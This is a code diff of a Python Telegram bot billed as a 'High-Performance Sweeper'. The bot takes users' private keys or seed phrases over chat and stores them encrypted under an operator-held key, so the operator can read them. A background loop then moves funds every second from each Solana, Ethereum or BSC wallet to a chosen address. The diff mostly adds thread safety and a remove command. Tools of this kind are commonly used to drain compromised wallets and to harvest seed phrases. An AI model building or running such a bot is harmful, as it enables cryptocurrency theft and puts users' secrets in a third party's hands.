@@ -6,34 +6,28 @@ import logging
 import json
 import os
 from cryptography.fernet import Fernet
+import threading
+from threading import Lock
 
 from chains import solana, ethereum, bsc
 from config import TELEGRAM_BOT_TOKEN
 
-# ---------------- FLASK ----------------
-
+# ---------------- CONFIG ----------------
 app = Flask(__name__)
-
-@app.route("/")
-def home():
-    return "Bot alive"
-
-# ---------------- LOGGING ----------------
-
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
-
-# ---------------- STORAGE ----------------
 
 DATA_FILE = "wallets.json"
 SECRET_KEY = os.getenv("SECRET_KEY")
 
 if not SECRET_KEY:
-    raise Exception("Missing SECRET_KEY")
+    raise Exception("Set SECRET_KEY environment variable!")
 
 cipher = Fernet(SECRET_KEY.encode())
 
-data_store = {}
+# ---------------- STORAGE ----------------
+data_store = {}          # user_id -> list of wallets
+data_lock = Lock()       # IMPORTANT for thread safety
 
 def encrypt(data: str) -> str:
     return cipher.encrypt(data.encode()).decode()
@@ -44,106 +38,157 @@ def decrypt(data: str) -> str:
 def load_data():
     global data_store
     if os.path.exists(DATA_FILE):
-        with open(DATA_FILE, "r") as f:
-            data_store.update(json.load(f))
+        try:
+            with open(DATA_FILE, "r") as f:
+                raw = json.load(f)
+                data_store = {int(k): v for k, v in raw.items()}
+            logger.info(f"✅ Loaded {sum(len(v) for v in data_store.values())} wallets")
+        except Exception as e:
+            logger.error(f"Failed to load data: {e}")
 
 def save_data():
-    with open(DATA_FILE, "w") as f:
-        json.dump(data_store, f)
+    try:
+        with data_lock:
+            with open(DATA_FILE, "w") as f:
+                json.dump(data_store, f, indent=2)
+    except Exception as e:
+        logger.error(f"Failed to save data: {e}")
+
+# ---------------- FLASK ----------------
+@app.route("/")
+def home():
+    return "Bot is alive ✅"
 
 # ---------------- COMMANDS ----------------
-
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("🤖 Bot online")
+    await update.message.reply_text(
+        "⚡ High-Performance Sweeper\n\n"
+        "/setwallet <chain> <secret> <destination>\n"
+        "/getinfo\n"
+        "/removewallet"
+    )
 
 async def setwallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if len(context.args) < 3:
-        await update.message.reply_text("Usage error")
+        await update.message.reply_text("Usage: /setwallet <chain> <secret> <destination>")
         return
 
     chain = context.args[0].lower()
     destination = context.args[-1]
-    secret = " ".join(context.args[1:-1])
+    secret_input = " ".join(context.args[1:-1])
+
+    if chain not in ["solana", "ethereum", "bsc"]:
+        await update.message.reply_text("Supported chains: solana, ethereum, bsc")
+        return
+
+    wallet_type = "seed" if " " in secret_input else "private_key"
 
     user_id = update.effective_user.id
-
-    data_store.setdefault(user_id, []).append({
+    wallet = {
         "chain": chain,
-        "secret": encrypt(secret),
+        "type": wallet_type,
+        "secret": encrypt(secret_input),
         "destination": destination
-    })
+    }
 
-    save_data()
-    await update.message.reply_text("Saved")
+    with data_lock:
+        data_store.setdefault(user_id, []).append(wallet)
+        save_data()
+
+    await update.message.reply_text(f"✅ Added {chain.upper()} ({wallet_type})")
 
 async def getinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
-    wallets = data_store.get(user_id, [])
+
+    with data_lock:
+        wallets = data_store.get(user_id, [])
 
     if not wallets:
-        await update.message.reply_text("No wallets")
+        await update.message.reply_text("No wallets set.")
         return
 
-    msg = "\n".join([f"{w['chain']} → {w['destination']}" for w in wallets])
+    msg = "📂 Your Wallets:\n\n"
+    for i, w in enumerate(wallets):
+        msg += f"{i+1}. {w['chain'].upper()} → {w['destination']}\n"
     await update.message.reply_text(msg)
 
-# ---------------- SWEEPER ----------------
+async def removewallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
 
+    with data_lock:
+        if user_id not in data_store or not data_store[user_id]:
+            await update.message.reply_text("No wallets to remove.")
+            return
+        data_store[user_id].pop()
+        if not data_store[user_id]:
+            del data_store[user_id]
+        save_data()
+
+    await update.message.reply_text("🗑 Last wallet removed.")
+
+# ---------------- SWEEPER ----------------
 MAX_CONCURRENT = 10
 
-async def process_wallet(wallet):
-    try:
-        secret = decrypt(wallet["secret"])
+async def process_wallet(user_id, wallet, semaphore):
+    async with semaphore:
+        try:
+            secret = decrypt(wallet["secret"])
+            chain_func = {
+                "solana": solana.forward,
+                "ethereum": ethereum.forward,
+                "bsc": bsc.forward
+            }[wallet["chain"]]
 
-        if wallet["chain"] == "solana":
-            await asyncio.to_thread(solana.forward, secret, wallet["destination"], 0)
-
-        elif wallet["chain"] == "ethereum":
-            await asyncio.to_thread(ethereum.forward, secret, wallet["destination"], 0)
-
-        elif wallet["chain"] == "bsc":
-            await asyncio.to_thread(bsc.forward, secret, wallet["destination"], 0)
-
-    except Exception as e:
-        logger.error(f"sweep error: {e}")
+            # Run potentially blocking crypto code in thread
+            await asyncio.to_thread(chain_func, secret, wallet["destination"], user_id)
+        except Exception as e:
+            logger.error(f"Error processing wallet for user {user_id}: {e}")
 
 async def sweeper_loop():
-    logger.info("Sweeper started")
+    logger.info("🚀 Sweeper loop started")
+    semaphore = asyncio.Semaphore(MAX_CONCURRENT)
 
     while True:
         tasks = []
+        with data_lock:
+            current_wallets = list(data_store.items())  # snapshot
 
-        for wallets in data_store.values():
-            for w in wallets:
-                tasks.append(process_wallet(w))
+        for user_id, wallets in current_wallets:
+            for wallet in wallets:
+                tasks.append(process_wallet(user_id, wallet, semaphore))
 
         if tasks:
-            await asyncio.gather(*tasks[:MAX_CONCURRENT])
+            try:
+                await asyncio.gather(*tasks, return_exceptions=True)
+            except Exception as e:
+                logger.error(f"Gather error: {e}")
 
-        await asyncio.sleep(2)
+        await asyncio.sleep(1)  # adjust as needed
 
-# ---------------- MAIN BOT ----------------
-
-async def run():
+# ---------------- MAIN ----------------
+async def main():
     load_data()
 
-    app_bot = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()
+    application = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()
 
-    app_bot.add_handler(CommandHandler("start", start))
-    app_bot.add_handler(CommandHandler("setwallet", setwallet))
-    app_bot.add_handler(CommandHandler("getinfo", getinfo))
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(CommandHandler("setwallet", setwallet))
+    application.add_handler(CommandHandler("getinfo", getinfo))
+    application.add_handler(CommandHandler("removewallet", removewallet))
 
-    # start background task safely
+    # Start sweeper
     asyncio.create_task(sweeper_loop())
 
-    logger.info("Bot running")
-
-    await app_bot.run_polling()
-
-# ---------------- ENTRY ----------------
+    logger.info("🤖 Telegram bot starting...")
+    await application.run_polling()
 
 if __name__ == "__main__":
-    asyncio.run(run())
+    # Run Flask in background thread
+    flask_thread = threading.Thread(
+        target=lambda: app.run(host="0.0.0.0", port=5000, debug=False),
+        daemon=True
+    )
+    flask_thread.start()
 
-    port = int(os.environ.get("PORT", 5000))
-    app.run(host="0.0.0.0", port=port)
+    # Run async bot in main thread
+    asyncio.run(main())
